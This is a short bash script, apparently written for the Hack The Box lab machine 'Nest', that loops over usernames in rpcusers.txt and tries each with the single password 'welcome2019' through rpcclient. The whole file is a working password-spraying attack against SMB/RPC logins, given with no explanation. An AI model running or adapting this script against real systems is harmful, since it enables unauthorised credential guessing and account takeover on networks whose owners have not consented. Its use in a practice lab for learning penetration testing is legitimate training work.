#!/bin/bash

for u in `cat rpcusers.txt`; do 
	echo -n "[*] user : $u" && 
	rpcclient -U "$u%welcome2019" -c "getusername;quit"  htb.nest
done
